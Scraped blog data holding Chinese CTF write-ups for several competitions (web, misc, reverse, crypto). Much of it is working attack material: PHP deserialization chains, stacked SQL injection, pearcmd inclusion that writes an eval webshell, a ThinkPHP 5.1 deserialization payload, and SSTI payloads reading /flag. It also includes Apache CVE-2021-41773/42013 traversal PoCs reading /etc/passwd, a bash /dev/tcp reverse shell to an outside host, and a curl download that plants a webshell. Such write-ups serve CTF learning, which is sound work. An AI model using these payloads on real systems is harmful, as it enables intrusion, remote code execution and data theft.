($this-&gt;func)(); &#125; &#125; class Sec&#123; private $obj; private $var; public function __toString() &#123; $this-&gt;obj-&gt;check($this-&gt;var); return &quot;CTFers&quot;; &#125; public function __invoke() &#123; echo file_get_contents(&#39;&#x2F;flag&#39;); &#125; &#125; class Easy&#123; public $cla; public function __call($fun, $var) &#123; $this-&gt;cla &#x3D; clone $var[0]; &#125; &#125; class eeee&#123; public $obj; public function __clone() &#123; if(isset($this-&gt;obj-&gt;cmd))&#123; echo &quot;success&quot;; &#125;&#125;&#125; $a &#x3D; new Start(); $a -&gt;name &#x3D; new Sec(); $a -&gt;name-&gt;obj &#x3D; new Easy(); $a -&gt;name-&gt;var &#x3D; new eeee(); $a -&gt;name-&gt;var-&gt;obj &#x3D; new Start(); $a -&gt;name-&gt;var-&gt;obj-&gt;func &#x3D; new Sec(); #payload #O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;N;s:4:&quot;func&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;N;s:3:&quot;var&quot;;N;&#125;&#125;&#125;&#125;s:4:&quot;func&quot;;N;&#125; 可以利用对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。 Word-For-You(2 Gen)报错注入就行 flag在wfy_comment表的id=100那行 ezAPI&lt;?php error_reporting(0); $id &#x3D; $_POST[&#39;id&#39;]; function waf($str) &#123; if (!is_numeric($str) || preg_replace(&quot;&#x2F;[0-9]&#x2F;&quot;, &quot;&quot;, $str) !&#x3D;&#x3D; &quot;&quot;) &#123; return False; &#125; else &#123; return True; &#125; &#125; function send($data) &#123; $options &#x3D; array( &#39;http&#39; &#x3D;&gt; array( &#39;method&#39; &#x3D;&gt; &#39;POST&#39;, &#39;header&#39; &#x3D;&gt; &#39;Content-type: application&#x2F;json&#39;, &#39;content&#39; &#x3D;&gt; $data, &#39;timeout&#39; &#x3D;&gt; 10 * 60 ) ); $context &#x3D; stream_context_create($options); $result &#x3D; file_get_contents(&quot;http:&#x2F;&#x2F;graphql:8080&#x2F;v1&#x2F;graphql&quot;, false, $context); return $result; &#125; if (isset($id)) &#123; if (waf($id)) &#123; isset($_POST[&#39;data&#39;]) ? $data &#x3D; $_POST[&#39;data&#39;] : $data &#x3D; &#39;&#123;&quot;query&quot;:&quot;query&#123;\\nusers_user_by_pk(id:&#39; . $id . &#39;) &#123;\\nname\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125;&#39;; $res &#x3D; json_decode(send($data)); if ($res-&gt;data-&gt;users_user_by_pk-&gt;name !&#x3D;&#x3D; NULL) &#123; echo &quot;ID: &quot; . $id . &quot;&lt;br&gt;Name: &quot; . $res-&gt;data-&gt;users_user_by_pk-&gt;name; &#125; else &#123; echo &quot;&lt;b&gt;Can&#39;t found it!&lt;&#x2F;b&gt;&lt;br&gt;&lt;br&gt;DEBUG: &quot;; var_dump($res-&gt;data); &#125; &#125; else &#123; die(&quot;&lt;b&gt;Hacker! Only Number!&lt;&#x2F;b&gt;&quot;); &#125; &#125; else &#123; die(&quot;&lt;b&gt;No Data?&lt;&#x2F;b&gt;&quot;); &#125; ?&gt; 本来以为会是一个stream_context_create的crlf漏洞，然后发现其实是graphql的安全问题 玩转graphQL (qq.com) 具体的看这个就行 先用内省查询获得数据 &#123;&quot;query&quot;:&quot;\\n query IntrospectionQuery &#123;\\r\\n __schema &#123;\\r\\n queryType &#123; name &#125;\\r\\n mutationType &#123; name &#125;\\r\\n subscriptionType &#123; name &#125;\\r\\n types &#123;\\r\\n ...FullType\\r\\n &#125;\\r\\n directives &#123;\\r\\n name\\r\\n description\\r\\n locations\\r\\n args &#123;\\r\\n ...InputValue\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n\\r\\n fragment FullType on __Type &#123;\\r\\n kind\\r\\n name\\r\\n description\\r\\n fields(includeDeprecated: true) &#123;\\r\\n name\\r\\n description\\r\\n args &#123;\\r\\n ...InputValue\\r\\n &#125;\\r\\n type &#123;\\r\\n ...TypeRef\\r\\n &#125;\\r\\n isDeprecated\\r\\n deprecationReason\\r\\n &#125;\\r\\n inputFields &#123;\\r\\n ...InputValue\\r\\n &#125;\\r\\n interfaces &#123;\\r\\n ...TypeRef\\r\\n &#125;\\r\\n enumValues(includeDeprecated: true) &#123;\\r\\n name\\r\\n description\\r\\n isDeprecated\\r\\n deprecationReason\\r\\n &#125;\\r\\n possibleTypes &#123;\\r\\n ...TypeRef\\r\\n &#125;\\r\\n &#125;\\r\\n\\r\\n fragment InputValue on __InputValue &#123;\\r\\n name\\r\\n description\\r\\n type &#123; ...TypeRef &#125;\\r\\n defaultValue\\r\\n &#125;\\r\\n\\r\\n fragment TypeRef on __Type &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &quot;,&quot;variables&quot;:null&#125; 找到flag在的地方，然后查询 &amp;data=&#123;&quot;query&quot;:&quot;query&#123;\\nffffllllaaagggg_1n_h3r3_flag &#123;\\nflag\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125; WEEK3BabySSTI_One直接用之前珍藏的那个ssti payload往里写马 multiSQL1&#39;;show tables;# 1&#39;;show columns from score;# 改成绩 1&#39;;SET @sqli=concat(char(117,112,100,97,116,101),&#39; score SET listen= 221&#39;);PREPARE hacker from @sqli;EXECUTE hacker;# 1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39;* from score&#39;);PREPARE hacker from @sqli;EXECUTE hacker;# 验证 IncludeTwopear文件包含rce ?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;+config-create+&#x2F;&lt;?&#x3D;eval($_POST[a]);?&gt;+&#x2F;tmp&#x2F;hello.php 然后包含hello.php TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJ3aG9hbWkiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNvNG1zIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ Maybe You Have To think More好怪的题目，不给源码的反序列化可还行 cookie里是序列化的内容，然后通过报错可以得到是tp5.1.41的版本。直接去网上找现成的反序列化链子。 正好有个对应版本的反序列化链，但是不知道为啥拿到的payload没法用，可能是源码不太一样 https://www.freebuf.com/vuls/269882.html 这里我们用这个 ThinkPHP5.1反序列化漏洞_Sentiment.的博客-CSDN博客_thinkphp5.1漏洞 https://www.freebuf.com/vuls/263977.html 与文章里唯一的不同就是要把序列化的内容放了cookie里。 然后在环境变量里可以找到flag WEEK4So Baby RCE两种方法： 一种是用&amp;&amp;来连接命令，使用cd来穿越目录，然后用sort来读取 cmd=cd%09..%26%26cd%09..%26%26cd%09..%26%26sort%09ffff?lllaaaaggggg 另一种是curl种马 cmd=curl%09-o%091.php%09ip WEEK5Unsafe ApacheCVE-2021-41773 影响版本：Apache 2.4.49 poc: curl -v --path-as-is http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;icons&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd curl -v --data &quot;echo;id&quot; &#39;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;bin&#x2F;sh&#39; curl -s --path-as-is -d &#39;echo Content-Type: text&#x2F;plain; echo; bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.190.146&#x2F;8888 0&gt;&amp;1&#39; &quot;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;bin&#x2F;sh&quot; url perl复制代码 CVE-2021-42013 影响版本：Apache 2.4.49 和 Apache 2.4.50 poc: curl -v --path-as-is http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;icons&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;etc&#x2F;passwd curl -v --data &quot;echo;id&quot; &#39;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh&#39; curl -s --path-as-is -d &#39;echo Content-Type: text&#x2F;plain; echo; whoami&#39; &quot;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh&quot; 从响应可以看到是apache2.4.50版本 如果服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令 直接构造payload进行rce &#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh So Baby RCE Again&lt;?php error_reporting(0); if(isset($_GET[&quot;cmd&quot;]))&#123; if(preg_match(&#39;&#x2F;bash|curl&#x2F;i&#39;,$_GET[&quot;cmd&quot;]))&#123; echo &quot;Hacker!&quot;; &#125;else&#123; shell_exec($_GET[&quot;cmd&quot;]); &#125; &#125;else&#123; show_source(__FILE__); &#125; 可以直接写文件，记得转义$号 ?cmd&#x3D;echo &quot;&lt;?php eval(\\$_POST[1]);phpinfo();?&gt;&quot; &gt; 1.php 可以看到根目录下有flag文件，但是因为是700的权限，所以我们需要提权 这里是利用的suid提权 find / -user root -perm -4000 -print 2&gt;/dev/null 不知道为什么在蚁剑的虚拟终端里没显示 看到有date，就可以利用date命令读取flag文件 这里在网页不会有回显，可能是因为date是通过报错把文件读出来的，但是网页没有回显Linux里的报错。(猜的，没验证过","categories":[],"tags":[]},{"title":"DASCTFxCBCTF","slug":"DASCTFxCBCTF","date":"2022-09-20T08:38:41.000Z","updated":"2022-09-20T14:59:34.493Z","comments":true,"path":"2022/09/20/DASCTFxCBCTF/","link":"","permalink":"https://ethe448.github.io/2022/09/20/DASCTFxCBCTF/","excerpt":"","text":"WEBdino3d进入后是一个3d版的游戏，死亡后会提示说玩够一百万分就能拿到flag 先来个非预期 我们在控制台可以看到score的属性 我们可以通过修改score.score的方式来修改我们的分数 然后是预期解 在js的源码里可以看到最后有这么一部分 sn(e, t) &#123; e &amp;&amp; t &amp;&amp; fetch(\"/check.php\", &#123; method: \"POST\", headers: &#123; \"Content-type\": \"application/x-www-form-urlencoded; charset=UTF-8\" &#125;, body: \"score=\" + parseInt(e).toString() + \"&amp;checkCode=\" + md5(parseInt(e).toString() + t) + \"&amp;tm=\" + (+new Date).toString().substring(0, 10) &#125;).then(e=>e.text()).then(e=>alert(e)) &#125; e和t分别为分数和checkCode checkCode由两部分组成 所以t=checkCode=DASxCBCTF_wElc03e 也就是向check.php发送post请求，其中有三个参数，score、checkCode、tm，score是我们的分数。我们可以设成1000000，这里的checkCode是md5(score.score+checkCode)，及md5(1000000DASxCBCTF_wElc03e),tm就是个时间戳 所以可以编写脚本 import requests import time url &#x3D; &#39;http:&#x2F;&#x2F;node4.buuoj.cn:27211&#x2F;check.php&#39; headers &#x3D; &#123; &quot;Content-type&quot;: &quot;application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8&quot; &#125; data &#x3D; &#123; &quot;score&quot;: &quot;1000000&quot;, &quot;checkCode&quot;: &#39;4639d0ab43e9030749f450eb6e9fbb97&#39;, &quot;tm&quot;: str(time.time())[:10] &#125; rep &#x3D; requests.post(url, data&#x3D;data, headers&#x3D;headers).text print(rep) Text ReverserSSTI但是过滤了&#123;&#123;，然后还把输入的内容进行了反序输出的操作，所以我们的payload在输入之前就要有一个反序的操作 &#123;&#123;没了可以用&#123;%%&#125;替代 照着这个payload改一下 &#123;%print(&#39;&#39;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read())%&#125; 改了之后的payload为 &#123;%print(&#39;&#39;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;nl &#x2F;flag&#39;).read())%&#125; 然后逆序一下 &#125;%))(daer.)&#39;galf&#x2F; ln&#39;(]&#39;nepop&#39;[__slabolg__.__tini__.]231[)(__sessalcbus__.__esab__.__ssalc__.&#39;&#39;(tnirp%&#123; cbshopjs的题，有附件，down下来审一下，主要是app.js。 题目主要功能就是用钱来买flag，但是普通用户只有10$，不可能买到11$的flag，而admin用户有9999，可以用来购买flag，于是我们就需要登录admin账号 从这里可以得到密码 登录之后发现钱够了但还是买不到flag。因为源码里在购买的部分还存在验证 product的值就是我们的传参 然后存在三个if判断，首先判断id是否为2，然后判断money是否大于11，并且是否存在一个user.token，最后一个if判断我们post传入的内容是否有flag这个关键字，如果有就提示go to ’readFileSync‘。如果没有就读取文件名为name的值的文件里面的内容。 第一个条件好满足，我们先来看第二个。首先我们知道user的构造如下，并没有token这个属性 所以如果我们想添加一个user.token的值，就需要借助原型链污染（js漏洞 | Ethe&#39;s blog (ethe448.github.io)）。而代码中正好存在利用的地方，这是一个进行复制操作的函数。 Object.assign(order[user.username], product); 如果user.username=__proto__，那么在执行这段代码的时候，就会造成我们的原型链污染。product的值我们可控。也就实现了为其添加user对象添加token属性的目的 所以首先是把user.username改成__proto__ 接下来就是传入product，name的值是我们想读的文件名，也就是/flag，然后添加一个token属性就可以。 由于第三个if的原因，所以第一次传参的时候是会被拦下来的。所以我们需要第二次传参，因为之前我们以及把name的值赋成了/flag，所以第二次传参就不再需要了（其实第二次随便传个json格式的内容就行，只要不覆盖第一次传的值。）。","categories":[],"tags":[]},{"title":"天山固网","slug":"天山固网","date":"2022-06-28T11:00:26.000Z","updated":"2022-09-20T14:57:56.288Z","comments":true,"path":"2022/06/28/天山固网/","link":"","permalink":"https://ethe448.github.io/2022/06/28/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/","excerpt":"","text":"为什么报名是学生组打比赛分到了企业组捏，企业这群人也太卷了 （只有web是我做的，其他跟我没啥关系 签到尝试一下解密？url解码 简单的图片拖进gimp里看到有三个图层，删去最上边的一个，就能看见flag webguesssql盲注，唯一的问题是这里只允许最大有四个参数，所以在盲注第五个数时要删去第一个 SSRFme利用file协议查看etc/hosts文件，找到主机的网段 bp扫一下，发现在100里有内容 接下来就是利用gopher协议把referer=dasctf.com带进去 提示要post一个参数dasctf，而且这个参数还要等于flag 重新构造gopher语句，最终得到flag MagicalTyperobots.txt里有个hint.php,访问一下，发现源码里是些html代码，拖到文档里改成html格式 利用数组溢出和filter伪协议读index.php的文件内容 解码之后是个反序列化 error_reporting(0); class Evil&#123; public $flag &#x3D; 1; public function __wakeup() &#123; $this-&gt;flag &#x3D; 0; &#125; public function __destruct() &#123; if($this-&gt;flag &#x3D;&#x3D; 1) &#123; echo(&quot;How you did it?&quot;); $xux &#x3D; file_get_contents($_GET[&#39;xux&#39;]); create_function(&quot;&quot;,$xux); &#125; else&#123; die(&quot;nonono&quot;); &#125; &#125; &#125; $o &#x3D; $_GET[&#39;o&#39;]; if(isset($o)) &#123; unserialize($o); &#125; 我们要利用的函数就算create_function，这个函数有个命令注入的漏洞。而$xux参数可以利用data协议进行控制，至于wakeup的绕过可以将最前面的O改成C（陇原战役里考过 之后发现空格也被过滤了，用${IFS}绕过 misc掩耳盗铃 压缩包解压出来的改成ppt格式然后把叠加的图层全删了 chrchrchr感觉像蚁剑的流量，蚁剑加密的方式就是base64加密之后再在前面添几位，所以从tcp流18开始往后找，删掉前两个字符先url解码再base64解码，把写入a.txt的内容拼起来 KJCUMVCRGFJEOZL2JJWE2V2RGNMW2SLXJZLVCM2ONJWGUTLNJZVU2VCBPBHFIZDIJZVFSMCOIRSGQTKHKJVWMUJ5HU&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 然后进行base32解码，再base64得到flag remeasyasm 自减 PEinM拖进ida里动调 能看出来在这里有一个被魔改过的xxtea 逆一下脚本 #include &lt;stdio.h&gt; #include &lt;stdint.h&gt; #define DELTA 0x9E377AB9 #define MX (((z&gt;&gt;4^y&lt;&lt;3) + (y&gt;&gt;4^z&lt;&lt;3)) ^ ((sum^y) + (key[p&amp;0xa^e] ^ z))) unsigned long long Summation(int n, unsigned long long delat) &#123; unsigned long long sum &#x3D; 0; for(int i &#x3D; 0; i &lt; 52&#x2F;n+6; i++) sum +&#x3D; delat; return sum; &#125; void btea(unsigned long long *v, int n, unsigned long long const key[4]) &#123; unsigned long long y, z, sum; unsigned p, round, e; if (n &gt; 1) &#123; round &#x3D; 6 + 52&#x2F;n; sum &#x3D; 0; z &#x3D; v[n-1]; do &#123; sum +&#x3D; DELTA; e &#x3D; (sum &gt;&gt; 2) &amp; 3; for (p&#x3D;0; p&lt;n-1; p++) &#123; y &#x3D; v[p+1]; v[p] +&#x3D; MX; z &#x3D; v[p]; &#125; y &#x3D; v[0]; z &#x3D; v[n-1] +&#x3D; MX; &#125; while (--round); &#125; else if (n &lt; -1) &#123; n &#x3D; -n; round &#x3D; 6 + 52&#x2F;n; sum &#x3D; Summation(n, DELTA); y &#x3D; v[0]; do &#123; e &#x3D; (sum &gt;&gt; 2) &amp; 3; for (p&#x3D;n-1; p&gt;0; p--) &#123; z &#x3D; v[p-1]; y &#x3D; v[p] -&#x3D; MX; &#125; z &#x3D; v[n-1]; y &#x3D; v[0] -&#x3D; MX; sum -&#x3D; DELTA; &#125; while (--round); &#125; &#125; int main() &#123; unsigned long long v[]&#x3D; &#123;0xBD548E45099A220B, 0x50BB9976358C558A, 0x20598FD852017357, 0xDC9B969877F6E8C2, 0xBEC5A96D9ECC6B87, 0x34D1D0E4390DF96D, 0x6796AEADE501CC5D, 0xDC643460C1430B8F, 0x7CA5CE8BE64FE5EE, 0x066B317D2C139F9B&#125;; unsigned long long const k[]&#x3D; &#123;0x0000000000000052, 0x0000000000000033, 0x0000000000000076, 0x0000000000000045, 0x0000000000000072, 0x0000000000000073, 0x0000000000000033, 0x000000000000005F, 0x0000000000000031, 0x0000000000000053, 0x000000000000005F, 0x0000000000000045, 0x0000000000000061, 0x0000000000000053, 0x0000000000000079, 0x000000000000000A&#125;; int n &#x3D; 0xa; btea(v, -n, k); for(int i &#x3D; 0; i &lt; 8*n; i++) &#123; printf(&quot;%c&quot;, ((unsigned char *)&amp;v)[i]); &#125; return 0; &#125; cryptorssssa9照着题目逆推脚本，用sage 交了一下结果不对 发现是加密的时候在后边填了点东西 再去掉加密里加上的最后那段123....321就行","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"dest0g3 520迎新赛wp","slug":"520迎新赛wp","date":"2022-05-20T05:34:28.000Z","updated":"2022-05-27T13:40:12.278Z","comments":true,"path":"2022/05/20/520迎新赛wp/","link":"","permalink":"https://ethe448.github.io/2022/05/20/520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp/","excerpt":"","text":"webphpdest和wm2020年的题一样 php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，如果require_once(‘flag.php’)，include的文件不运行再通过require_once包含。通过知识点：/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接，利用伪协议配合多级符号链接的办法进行绕过。 payload php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php 解码拿到flag php源码分析 require_once 绕过不能重复包含文件的限制 - 安全客，安全资讯平台 (anquanke.com) EasyPHP应该是要利用报错进入set_error_handler里，传个数组就成功了 SimpleRCE利用进制编码和通配符绕过 payload aaa&#x3D;hex2bin(&#39;73797374656d&#39;)(&#39;uniq &#x2F;f*&#39;); EasySSTI用这篇文章里的方法改改就行https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/ 首先用%0a绕过空格的过滤，然后利用&#123;%%&#125;和set绕过关键字，利用pop和()|select|string|list得到下划线，最后就是用__getitem__ 构造类似x.__init__.__globals__[&#39;__builtins__&#39;].chr 这种payload得到chr和open，猜测flag在根目录下的&#x2F;flag中，尝试读取 最终payload username&#x3D;&#123;%set%0apo&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#123;%set%0aa&#x3D;(()|select|string|list)|attr(po)(24)%&#125;&#123;%set%0aini&#x3D;(a,a,dict(in&#x3D;a,it&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0aglo&#x3D;(a,a,dict(gl&#x3D;a,obals&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0ageti&#x3D;(a,a,dict(getit&#x3D;a,em&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0abuilt&#x3D;(a,a,dict(bui&#x3D;a,ltins&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0ax&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;%%0aset%0ach&#x3D;dict(ch&#x3D;a,r&#x3D;a)|join%&#125;&#123;%set%0ax&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;%set%0achr&#x3D;(x|attr(geti))(ch)%&#125;&#123;%set%0afile&#x3D;chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;&#123;%%0aset%0aop&#x3D;dict(ope&#x3D;a,n&#x3D;a)|join%&#125;&#123;%set%0aopen&#x3D;(x|attr(geti))(op)%&#125;&#123;%%0aset%0are&#x3D;dict(re&#x3D;a,ad&#x3D;a)|join%&#125;&#123;%print(open(file)|attr(re)())%&#125;&amp;password&#x3D;x PharPOP&lt;?php highlight_file(__FILE__); function waf($data)&#123; if (is_array($data))&#123; die(&quot;Cannot transfer arrays&quot;); &#125; if (preg_match(&#39;&#x2F;get|air|tree|apple|banana|php|filter|base64|rot13|read|data&#x2F;i&#39;, $data)) &#123; die(&quot;You can&#39;t do&quot;); &#125; &#125; class air&#123; public $p; public function __set($p, $value) &#123; $p &#x3D; $this-&gt;p-&gt;act; echo new $p($value); &#125; &#125; class tree&#123; public $name; public $act; public function __destruct() &#123; return $this-&gt;name(); &#125; public function __call($name, $arg)&#123; $arg[1] &#x3D;$this-&gt;name-&gt;$name; &#125; &#125; class apple &#123; public $xxx; public $flag; public function __get($flag) &#123; $this-&gt;xxx-&gt;$flag &#x3D; $this-&gt;flag; &#125; &#125; class D &#123; public $start; public function __destruct()&#123; $data &#x3D; $_POST[0]; if ($this-&gt;start &#x3D;&#x3D; &#39;w&#39;) &#123; waf($data); $filename &#x3D; &quot;&#x2F;tmp&#x2F;&quot;.md5(rand()).&quot;.jpg&quot;; file_put_contents($filename, $data); echo $filename; &#125; else if ($this-&gt;start &#x3D;&#x3D; &#39;r&#39;) &#123; waf($data); $f &#x3D; file_get_contents($data); if($f)&#123; echo &quot;It is file&quot;; &#125; else&#123; echo &quot;You can look at the others&quot;; &#125; &#125; &#125; &#125; class banana &#123; public function __get($name)&#123; return $this-&gt;$name; &#125; &#125; &#x2F;&#x2F; flag in &#x2F; if(strlen($_POST[1]) &lt; 55) &#123; $a &#x3D; unserialize($_POST[1]); &#125; else&#123; echo &quot;str too long&quot;; &#125; throw new Error(&quot;start&quot;); ?&gt; 题目很明显是要先post参数1去调用D类里的file_put_content，然后写入我们的phar文件，再通过file_get_content去访问phar文件来实现反序列化，从air类里的echo new $p($value);也能看出这里要用原生类来读目录和文件。 链子很简单，就不说了。这里主要的难度是绕过最后的throw new Error(&quot;start&quot;);语句，如果想利用destruct方法反序列化会因为最后的抛出错误的语句导致程序提前结束，所以这里要利用unset来绕过最后的错误，让反序列化成功进行 具体的步骤看这个 [phar反序列化][NSSCTF]prize_p1_Snakin_ya的博客-CSDN博客 所以写文件时： 参数1： O:1:&quot;D&quot;:2:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;s:4:&quot;star&quot;;O:1:&quot;D&quot;:1:N&#125; 参数0： 生成phar文件之后在010里进行修改（这是读文件的phar，读目录的时候忘了截图被覆盖了 然后修改签名 from hashlib import sha1 file &#x3D; open(&#39;..&#x2F;php&#x2F;NSSCTF prize_p1&#x2F;ars.phar&#39;, &#39;rb&#39;).read() text &#x3D; file[:-28] #读取开始到末尾除签名外内容 last &#x3D; file[-8:] #读取最后8位的GBMB和签名flag new_file &#x3D; text+sha1(text).digest() + last #生成新的文件内容，主要是此时sha1正确了。 open(&#39;reaflag2.phar&#39;, &#39;wb&#39;).write(new_file) 达到调用unset的目的 然后要绕过代码中的waf，可以对phar文件进行压缩，原理可以看这个https://www.anquanke.com/post/id/240007#h2-5 再利用python脚本上传文件 import request url &#x3D; &#39;http:&#x2F;&#x2F;8bfdc886-3097-4a19-978d-9a417e256662.node4.buuoj.cn:81&#x2F;&#39; res &#x3D; requests.post( url, data&#x3D;&#123; 1: &#39;O:1:&quot;D&quot;:2:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;s:4:&quot;star&quot;;O:1:&quot;D&quot;:1:N&#125;&#39;, 0: open(&#39;.&#x2F;reaflag2.phar.gz&#39;, &#39;rb&#39;).read() &#125; ) # 写入 print(res.text) 得到上传地址之后利用phar协议访问一下就行。 改phar内容的时候不能用txt，上传也不能用burp，这两个卡了我好久。。。 MISCWelcome to fxxking DestCTF纯签到 Pngenius图片里有个压缩包，分离出来之后发现需要密码，猜测密码也在图片里，zsteg跑一遍 拿到密码,打开压缩包找到flag EasyEncode爆破跑密码 里面是摩斯密码，解码之后是一大串数字 5 C 7 5 3 0 3 0 3 5 3 2 5 C 7 5 3 0 3 0 3 4 3 7 5 C 7 5 3 0 3 0 3 5 3 6 5 C 7 5 3 0 3 0 3 7 6 1 5 C 7 5 3 0 3 0 3 6 3 4 5 C 7 5 3 0 3 0 3 4 3 4 5 C 7 5 3 0 3 0 3 4 3 2 5 C 7 5 3 0 3 0 3 6 6 5 5 C 7 5 3 0 3 0 3 4 6 4 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 7 3 4 5 C 7 5 3 0 3 0 3 4 3 5 5 C 7 5 3 0 3 0 3 5 6 1 5 C 7 5 3 0 3 0 3 5 3 7 5 C 7 5 3 0 3 0 3 3 3 9 5 C 7 5 3 0 3 0 3 6 6 2 5 C 7 5 3 0 3 0 3 6 3 1 5 C 7 5 3 0 3 0 3 5 3 7 5 C 7 5 3 0 3 0 3 3 3 5 5 C 7 5 3 0 3 0 3 6 6 5 5 C 7 5 3 0 3 0 3 5 3 8 5 C 7 5 3 0 3 0 3 7 6 1 5 C 7 5 3 0 3 0 3 4 3 6 5 C 7 5 3 0 3 0 3 7 6 1 5 C 7 5 3 0 3 0 3 5 3 8 5 C 7 5 3 0 3 0 3 3 3 2 5 C 7 5 3 0 3 0 3 5 3 5 5 C 7 5 3 0 3 0 3 3 3 0 5 C 7 5 3 0 3 0 3 6 3 3 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 6 6 3 5 C 7 5 3 0 3 0 3 6 3 6 5 C 7 5 3 0 3 0 3 4 6 5 5 C 7 5 3 0 3 0 3 4 3 6 5 C 7 5 3 0 3 0 3 3 3 9 5 C 7 5 3 